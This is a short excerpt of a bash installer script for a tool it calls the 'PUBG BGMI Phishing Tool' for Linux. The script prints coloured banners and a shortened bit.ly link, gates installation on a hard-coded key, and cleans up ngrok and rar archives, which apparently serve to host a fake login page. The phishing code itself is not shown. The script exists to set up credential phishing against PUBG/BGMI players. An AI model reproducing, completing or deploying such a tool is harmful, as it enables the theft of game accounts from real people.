...
echo ""
echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m Link :\e[0m\e[1;36m https://bit.ly/3xgXUiT  "
echo ""
echo ""
...
echo""
echo""
if [[ $option == *'4BMX25TWUVHE7HK7'* ]]; then
clear
echo ""
echo ""
echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The PUBG BGMI Phishing Tool Please Wait....  \e[0m"
...
rm -rf ngrok-stable-linux-arm.zip  SUMAN-PUBG.rar SUMAN-BGMI.rar
...
sleep 4
echo
echo -e "\e[1m \e[36m[+] There PUBG BGMI Phishing Tool Script for Linux \e[m \e[21"
echo
echo
